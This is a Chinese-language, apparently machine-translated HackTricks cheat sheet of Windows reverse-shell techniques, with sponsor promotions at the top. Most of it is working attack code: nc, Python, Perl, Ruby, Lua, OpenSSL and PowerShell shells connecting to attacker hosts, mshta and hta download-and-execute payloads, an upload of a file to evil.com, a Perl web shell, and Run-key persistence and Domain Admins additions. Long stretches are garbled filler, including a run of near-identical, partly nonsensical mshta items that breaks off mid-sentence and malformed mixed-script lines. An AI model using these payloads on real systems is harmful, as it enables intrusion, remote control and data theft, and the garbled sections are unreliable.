# Windows反弹Shell

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram群组**](https://t.me/peass) 或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof是所有加密漏洞赏金的家园。**

**即时获得奖励**\
HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞验证后，您将获得奖励。

**在web3渗透测试中积累经验**\
区块链协议和智能合约是新的互联网！在其兴起的时代掌握web3安全。

**成为web3黑客传奇**\
每次验证的漏洞都会获得声望积分，并占据每周排行榜的榜首。

[**在HackenProof上注册**](https://hackenproof.com/register)开始从您的黑客行为中获利！

{% embed url="https://hackenproof.com/register" %}

## Lolbas

网页[lolbas-project.github.io](https://lolbas-project.github.io/)类似于Linux的[https://gtfobins.github.io/](https://gtfobins.github.io/)。\
显然，**Windows中没有SUID文件或sudo权限**，但了解**如何**滥用**某些二进制文件**以执行某些意外操作是很有用的，比如**执行任意代码**。

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**sbd** 是一个 Netcat 克隆版本，旨在提供可移植性和强大的加密功能。它可以在类Unix操作系统和Microsoft Win32上运行。sbd 使用 AES-CBC-128 + HMAC-SHA1 加密（由 Christophe Devine 实现），支持程序执行（-e 选项）、选择源端口、延迟连续重连以及其他一些不错的功能。sbd 仅支持 TCP/IP 通信。sbd.exe（Kali Linux 发行版的一部分：/usr/share/windows-resources/sbd/sbd.exe）可以作为 Netcat 的替代品上传到 Windows 系统中。

## Python
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl

Perl是一种通用的脚本编程语言，广泛用于网络编程和系统管理。它具有强大的文本处理能力和灵活的语法，使其成为渗透测试和黑客活动中常用的工具之一。

### Perl反向Shell

Perl反向Shell是一种通过网络连接与目标系统进行交互的工具。它可以在目标系统上执行命令、上传和下载文件，以及执行其他与系统交互相关的操作。

以下是一个Perl反向Shell的示例代码：

```perl
use Socket;
use FileHandle;

$host = "attacker.com";
$port = 4444;

$proto = getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto);
$sin = sockaddr_in($port, inet_aton($host));
connect(SOCKET, $sin);

open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");

system("/bin/sh -i");
```

要使用Perl反向Shell，只需将`$host`和`$port`变量设置为攻击者的IP地址和监听端口。然后，将代码上传到目标系统并执行。

### Perl Web Shell

Perl Web Shell是一种通过Web界面与目标系统进行交互的工具。它通常作为一个Web应用程序部署在Web服务器上，可以通过浏览器访问。

以下是一个Perl Web Shell的示例代码：

```perl
#!/usr/bin/perl

use CGI qw(:standard);

print header;
print start_html(-title=>'Perl Web Shell', -bgcolor=>'white');

if (param()) {
    my $cmd = param('cmd');
    print "<pre>";
    print `$cmd`;
    print "</pre>";
}

print "<form method='post'>";
print "<input type='text' name='cmd'>";
print "<input type='submit' value='Execute'>";
print "</form>";

print end_html;
```

要使用Perl Web Shell，只需将代码保存为`.pl`文件，并将其部署到Web服务器上。然后，通过浏览器访问该文件，即可在Web界面上执行命令。

### Perl漏洞利用

Perl在过去的几年中发现了一些安全漏洞，这些漏洞可能被黑客利用。因此，在进行渗透测试或黑客活动时，了解这些漏洞并采取相应的防护措施非常重要。

以下是一些常见的Perl漏洞：

- [CVE-2016-1238](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1238): Perl模块`Archive::Tar`中的目录遍历漏洞。
- [CVE-2016-1237](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1237): Perl模块`Archive::Tar`中的目录遍历漏洞。
- [CVE-2016-1236](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1236): Perl模块`Archive::Tar`中的目录遍历漏洞。

要利用这些漏洞，黑客可以编写专门的代码或使用现有的工具。然而，为了保护系统安全，建议及时更新Perl和相关模块，并遵循最佳实践来防止漏洞利用。
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby是一种动态、面向对象的编程语言，常用于Web开发。它具有简洁的语法和强大的功能，被广泛用于构建各种应用程序。

### 安装Ruby

要在Windows上安装Ruby，可以按照以下步骤进行操作：

1. 访问[Ruby官方网站](https://www.ruby-lang.org/en/downloads/)，下载适用于Windows的Ruby安装程序。
2. 运行安装程序，并按照提示完成安装过程。
3. 在命令提示符或PowerShell中，输入`ruby -v`命令，验证Ruby是否成功安装。

### Ruby Shell

Ruby提供了一个交互式的Shell环境，可以用于执行Ruby代码和调试。要启动Ruby Shell，只需在命令提示符或PowerShell中输入`irb`命令。

### Ruby脚本

除了在Ruby Shell中执行代码，还可以将Ruby代码保存为脚本文件并在命令行中运行。要创建一个Ruby脚本，只需使用任何文本编辑器创建一个以`.rb`为扩展名的文件，并将Ruby代码写入其中。

要在命令行中运行Ruby脚本，可以使用以下命令：

```
ruby script.rb
```

### Ruby Gems

Ruby Gems是Ruby的包管理器，用于安装和管理Ruby库。要安装一个Ruby Gem，可以使用以下命令：

```
gem install gem_name
```

要列出已安装的Ruby Gems，可以使用以下命令：

```
gem list
```

### Ruby文档

Ruby提供了详细的文档，可以帮助您了解Ruby的各种功能和用法。要访问Ruby文档，可以使用以下命令：

```
ri command_or_class
```

例如，要查看`Array`类的文档，可以使用以下命令：

```
ri Array
```

### 总结

Ruby是一种功能强大且易于学习的编程语言，适用于各种应用程序开发。通过安装Ruby、使用Ruby Shell、编写Ruby脚本、安装Ruby Gems和查阅Ruby文档，您可以开始使用Ruby并掌握其各种特性和功能。
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Lua是一种轻量级的脚本语言，常用于嵌入式系统和游戏开发。它具有简单、高效和可扩展的特点，可以通过C语言进行扩展。Lua脚本可以在Windows系统上运行，并且可以通过多种方式与操作系统进行交互。

### Windows下的Lua Shell

在Windows系统上，可以使用Lua的交互式Shell来执行Lua脚本。以下是一些常用的Lua Shell：

- **Lua for Windows**：这是一个集成了Lua解释器和编辑器的软件包，可以在Windows上运行Lua脚本。它提供了一个交互式的Lua Shell，可以直接在命令行中输入Lua代码并执行。

- **ZeroBrane Studio**：这是一个跨平台的集成开发环境（IDE），支持多种编程语言，包括Lua。它提供了一个交互式的Lua Shell，可以在IDE中直接输入和执行Lua代码。

### 与操作系统交互

Lua脚本可以通过调用操作系统的API函数来与操作系统进行交互。以下是一些常用的Lua函数，用于与Windows操作系统进行交互：

- **os.execute(command)**：执行操作系统命令。可以使用该函数执行任意的Windows命令，如创建文件、删除文件等。

- **os.getenv(variable)**：获取操作系统环境变量的值。可以使用该函数获取Windows系统的环境变量，如PATH、TEMP等。

- **io.popen(command, mode)**：执行操作系统命令，并返回一个文件对象。可以使用该函数执行命令，并读取命令的输出。

### 示例

以下是一个使用Lua脚本与Windows操作系统交互的示例：

```lua
-- 执行命令并获取输出
local file = io.popen("dir")
local output = file:read("*a")
file:close()

-- 打印输出
print(output)

-- 获取环境变量的值
local path = os.getenv("PATH")
print(path)
```

在上面的示例中，首先使用`io.popen`函数执行`dir`命令，并将输出保存到`output`变量中。然后使用`print`函数打印输出。接下来使用`os.getenv`函数获取`PATH`环境变量的值，并将其打印出来。

通过使用这些函数，可以在Lua脚本中与Windows操作系统进行交互，执行命令、获取环境变量等操作。
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

攻击者（Kali）
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
受害者
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

Powershell是一种功能强大的脚本语言和命令行工具，广泛用于Windows系统中。它提供了许多内置的命令和功能，可以用于自动化任务、系统管理和网络攻击。

### Powershell基础知识

- Powershell的命令以`cmdlet`的形式存在，可以通过`Get-Command`命令查看可用的命令。
- Powershell支持管道操作符`|`，可以将一个命令的输出作为另一个命令的输入。
- Powershell使用`-`作为命令参数的前缀，例如`Get-Process -Name explorer`。
- Powershell支持变量，可以使用`$`符号来声明和引用变量。
- Powershell支持条件语句（如`if`、`else`）和循环语句（如`foreach`、`while`）。

### Powershell远程执行

Powershell可以通过远程执行来控制远程Windows系统。以下是一些常用的远程执行方法：

- 使用`Enter-PSSession`命令建立与远程系统的交互式会话。
- 使用`Invoke-Command`命令在远程系统上执行命令或脚本。
- 使用`New-PSSession`命令创建一个持久化的远程会话，并使用`Invoke-Command`命令在该会话中执行命令或脚本。

### Powershell后渗透技巧

Powershell在后渗透测试中非常有用，以下是一些常用的Powershell后渗透技巧：

- 使用`Get-WmiObject`命令获取远程系统的信息。
- 使用`Get-Process`命令查看远程系统上运行的进程。
- 使用`Get-Service`命令查看远程系统上的服务。
- 使用`Get-EventLog`命令查看远程系统上的事件日志。
- 使用`Get-Content`命令读取远程系统上的文件内容。
- 使用`Set-Content`命令写入内容到远程系统上的文件。

Powershell是一种功能强大且灵活的工具，可以在渗透测试和系统管理中发挥重要作用。熟练掌握Powershell的基础知识和常用技巧，将有助于提高工作效率和攻击能力。
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
执行网络调用的进程：**powershell.exe**\
写入磁盘的有效载荷：**否**（至少在我使用 procmon 时没有找到！）
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
执行网络调用的进程：**svchost.exe**\
写入磁盘的有效载荷：**WebDAV客户端本地缓存**

**一行命令：**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**在本文档末尾获取有关不同Powershell Shell的更多信息**

## Mshta

Mshta是一种可执行文件，用于执行HTML应用程序。它可以用于在Windows系统上执行恶意代码。以下是一些使用Mshta的常见技术：

### 1. 使用远程URL执行代码

使用Mshta，可以通过远程URL执行恶意代码。以下是一个示例：

```powershell
mshta http://evil.com/malicious.hta
```

### 2. 使用本地文件执行代码

使用Mshta，还可以通过本地文件执行恶意代码。以下是一个示例：

```powershell
mshta C:\path\to\malicious.hta
```

### 3. 使用VBScript执行代码

使用Mshta，可以执行VBScript代码。以下是一个示例：

```powershell
mshta vbscript:Execute("MsgBox ""Hello, World!""")"
```

### 4. 使用JavaScript执行代码

使用Mshta，还可以执行JavaScript代码。以下是一个示例：

```powershell
mshta javascript:alert("Hello, World!")
```

### 5. 使用ActiveX对象执行代码

使用Mshta，可以使用ActiveX对象执行代码。以下是一个示例：

```powershell
mshta javascript:var shell=new ActiveXObject("WScript.Shell");shell.Run("calc.exe");
```

### 6. 使用VBScript和JavaScript混合执行代码

使用Mshta，可以混合使用VBScript和JavaScript执行代码。以下是一个示例：

```powershell
mshta vbscript:Execute("MsgBox ""Hello, World!""");javascript:alert("Hello, World!")
```

### 7. 使用VBScript和ActiveX对象混合执行代码

使用Mshta，可以混合使用VBScript和ActiveX对象执行代码。以下是一个示例：

```powershell
mshta vbscript:Execute("MsgBox ""Hello, World!""");javascript:var shell=new ActiveXObject("WScript.Shell");shell.Run("calc.exe");
```

### 8. 使用JavaScript和ActiveX对象混合执行代码

使用Mshta，可以混合使用JavaScript和ActiveX对象执行代码。以下是一个示例：

```powershell
mshta javascript:alert("Hello, World!");vbscript:var shell=new ActiveXObject("WScript.Shell");shell.Run("calc.exe");
```

### 9. 使用VBScript、JavaScript和ActiveX对象混合执行代码

使用Mshta，可以混合使用VBScript、JavaScript和ActiveX对象执行代码。以下是一个示例：

```powershell
mshta vbscript:Execute("MsgBox ""Hello, World!""");javascript:alert("Hello, World!");vbscript:var shell=new ActiveXObject("WScript.Shell");shell.Run("calc.exe");
```

### 10. 使用VBScript和JavaScript执行文件下载

使用Mshta，可以使用VBScript和JavaScript执行文件下载。以下是一个示例：

```powershell
mshta vbscript:dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://evil.com/malware.exe", False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile "C:\path\to\malware.exe", 2
end with
```

### 11. 使用VBScript和JavaScript执行文件上传

使用Mshta，可以使用VBScript和JavaScript执行文件上传。以下是一个示例：

```powershell
mshta vbscript:dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
dim file: Set file = fso.GetFile("C:\path\to\file.txt")
dim xhr: Set xhr = CreateObject("MSXML2.XMLHTTP")
xhr.open "POST", "http://evil.com/upload.php", False
xhr.setRequestHeader "Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary1234567890"
xhr.send "------WebKitFormBoundary1234567890" & vbCrLf &_
          "Content-Disposition: form-data; name=""file""; filename=""" & file.Name & """" & vbCrLf &_
          "Content-Type: application/octet-stream" & vbCrLf & vbCrLf &_
          file.OpenAsTextStream(1).ReadAll & vbCrLf &_
          "------WebKitFormBoundary1234567890--"
```

### 12. 使用VBScript和JavaScript执行命令执行

使用Mshta，可以使用VBScript和JavaScript执行命令执行。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run("cmd.exe /c calc.exe")
```

### 13. 使用VBScript和JavaScript执行反弹Shell

使用Mshta，可以使用VBScript和JavaScript执行反弹Shell。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run("cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(""10.10.10.10"",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ""PS "" + (pwd).Path + "" > "";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
```

### 14. 使用VBScript和JavaScript执行文件包含

使用Mshta，可以使用VBScript和JavaScript执行文件包含。以下是一个示例：

```powershell
mshta vbscript:Execute("Dim fso: Set fso = CreateObject(""Scripting.FileSystemObject""): fso.OpenTextFile(""C:\path\to\file.txt"").ReadAll")
```

### 15. 使用VBScript和JavaScript执行文件删除

使用Mshta，可以使用VBScript和JavaScript执行文件删除。以下是一个示例：

```powershell
mshta vbscript:CreateObject("Scripting.FileSystemObject").DeleteFile("C:\path\to\file.txt")
```

### 16. 使用VBScript和JavaScript执行文件复制

使用Mshta，可以使用VBScript和JavaScript执行文件复制。以下是一个示例：

```powershell
mshta vbscript:CreateObject("Scripting.FileSystemObject").CopyFile "C:\path\to\file.txt", "C:\path\to\destination\file.txt"
```

### 17. 使用VBScript和JavaScript执行文件移动

使用Mshta，可以使用VBScript和JavaScript执行文件移动。以下是一个示例：

```powershell
mshta vbscript:CreateObject("Scripting.FileSystemObject").MoveFile "C:\path\to\file.txt", "C:\path\to\destination\file.txt"
```

### 18. 使用VBScript和JavaScript执行文件重命名

使用Mshta，可以使用VBScript和JavaScript执行文件重命名。以下是一个示例：

```powershell
mshta vbscript:CreateObject("Scripting.FileSystemObject").MoveFile "C:\path\to\file.txt", "C:\path\to\file_renamed.txt"
```

### 19. 使用VBScript和JavaScript执行目录创建

使用Mshta，可以使用VBScript和JavaScript执行目录创建。以下是一个示例：

```powershell
mshta vbscript:CreateObject("Scripting.FileSystemObject").CreateFolder "C:\path\to\new_folder"
```

### 20. 使用VBScript和JavaScript执行目录删除

使用Mshta，可以使用VBScript和JavaScript执行目录删除。以下是一个示例：

```powershell
mshta vbscript:CreateObject("Scripting.FileSystemObject").DeleteFolder "C:\path\to\folder"
```

### 21. 使用VBScript和JavaScript执行注册表项创建

使用Mshta，可以使用VBScript和JavaScript执行注册表项创建。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyApp", "C:\path\to\malicious.exe", "REG_SZ"
```

### 22. 使用VBScript和JavaScript执行注册表项删除

使用Mshta，可以使用VBScript和JavaScript执行注册表项删除。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyApp"
```

### 23. 使用VBScript和JavaScript执行服务创建

使用Mshta，可以使用VBScript和JavaScript执行服务创建。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc create MyService binPath= ""C:\path\to\malicious.exe"" start= auto"
```

### 24. 使用VBScript和JavaScript执行服务删除

使用Mshta，可以使用VBScript和JavaScript执行服务删除。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc delete MyService"
```

### 25. 使用VBScript和JavaScript执行服务启动

使用Mshta，可以使用VBScript和JavaScript执行服务启动。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc start MyService"
```

### 26. 使用VBScript和JavaScript执行服务停止

使用Mshta，可以使用VBScript和JavaScript执行服务停止。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc stop MyService"
```

### 27. 使用VBScript和JavaScript执行服务重启

使用Mshta，可以使用VBScript和JavaScript执行服务重启。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc stop MyService && sc start MyService"
```

### 28. 使用VBScript和JavaScript执行服务禁用

使用Mshta，可以使用VBScript和JavaScript执行服务禁用。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService start= disabled"
```

### 29. 使用VBScript和JavaScript执行服务启用

使用Mshta，可以使用VBScript和JavaScript执行服务启用。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService start= auto"
```

### 30. 使用VBScript和JavaScript执行服务查询

使用Mshta，可以使用VBScript和JavaScript执行服务查询。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc query MyService"
```

### 31. 使用VBScript和JavaScript执行服务修改

使用Mshta，可以使用VBScript和JavaScript执行服务修改。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService binPath= ""C:\path\to\malicious.exe"""
```

### 32. 使用VBScript和JavaScript执行服务权限提升

使用Mshta，可以使用VBScript和JavaScript执行服务权限提升。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""LocalSystem"""
```

### 33. 使用VBScript和JavaScript执行服务权限降低

使用Mshta，可以使用VBScript和JavaScript执行服务权限降低。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""LocalService"""
```

### 34. 使用VBScript和JavaScript执行服务权限提权

使用Mshta，可以使用VBScript和JavaScript执行服务权限提权。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""NT AUTHORITY\SYSTEM"""
```

### 35. 使用VBScript和JavaScript执行服务权限降权

使用Mshta，可以使用VBScript和JavaScript执行服务权限降权。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""NT AUTHORITY\NETWORK SERVICE"""
```

### 36. 使用VBScript和JavaScript执行服务权限提升到管理员

使用Mshta，可以使用VBScript和JavaScript执行服务权限提升到管理员。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""BUILTIN\Administrators"""
```

### 37. 使用VBScript和JavaScript执行服务权限降低到用户

使用Mshta，可以使用VBScript和JavaScript执行服务权限降低到用户。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""BUILTIN\Users"""
```

### 38. 使用VBScript和JavaScript执行服务权限提升到域管理员

使用Mshta，可以使用VBScript和JavaScript执行服务权限提升到域管理员。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""DOMAIN\Administrator"""
```

### 39. 使用VBScript和JavaScript执行服务权限降低到域用户

使用Mshta，可以使用VBScript和JavaScript执行服务权限降低到域用户。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""DOMAIN\User"""
```

### 40. 使用VBScript和JavaScript执行服务权限提升到本地管理员

使用Mshta，可以使用VBScript和JavaScript执行服务权限提升到本地管理员。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= "".\Administrator"""
```

### 41. 使用VBScript和JavaScript执行服务权限降低到本地用户

使用Mshta，可以使用VBScript和JavaScript执行服务权限降低到本地用户。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= "".\User"""
```

### 42. 使用VBScript和JavaScript执行服务权限提升到系统

使用Mshta，可以使用VBScript和JavaScript执行服务权限提升到系统。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""NT AUTHORITY\SYSTEM"""
```

### 43. 使用VBScript和JavaScript执行服务权限降低到网络服务

使用Mshta，可以使用VBScript和JavaScript执行服务权限降低到网络服务。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""NT AUTHORITY\NETWORK SERVICE"""
```

### 44. 使用VBScript和JavaScript执行服务权限提升到管理员组

使用Mshta，可以使用VBScript和JavaScript执行服务权限提升到管理员组。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c net localgroup Administrators MyUser /add"
```

### 45. 使用VBScript和JavaScript执行服务权限降低到用户组

使用Mshta，可以使用VBScript和JavaScript执行服务权限降低到用户组。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c net localgroup Users MyUser /add"
```

### 46. 使用VBScript和JavaScript执行服务权限提升到域管理员组

使用Mshta，可以使用VBScript和JavaScript执行服务权限提升到域管理员组。以下是一个示例：

```powershell
mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c net group ""Domain Admins"" MyUser /add /domain"
```

### 47. 使用VBScript和JavaScript执行服务权限降低到域用户组

使用Mshta，可以使用VBScript和JavaScript执行服务权限降低到域用户组。以下是
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
执行网络调用的进程：**mshta.exe**\
写入磁盘的载荷：**IE 本地缓存**
```bash
mshta http://webserver/payload.hta
```
执行网络调用的进程：**mshta.exe**\
写入磁盘的载荷：**IE 本地缓存**
```bash
mshta \\webdavserver\folder\payload.hta
```
执行网络调用的进程：**svchost.exe**\
写入磁盘的有效载荷：**WebDAV客户端本地缓存**

#### **hta-psh反向shell示例（使用hta下载并执行PS后门）**
```markup
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**您可以使用stager hta非常容易地下载并执行Koadic僵尸**

#### hta示例
```markup
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

#### **mshta - sct**
```markup
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

#### **Mshta - Metasploit**

Mshta is a Microsoft HTML Application Host that allows you to execute HTML applications (.hta files) on Windows systems. It is a legitimate Windows component, but it can also be used by attackers to execute malicious code.

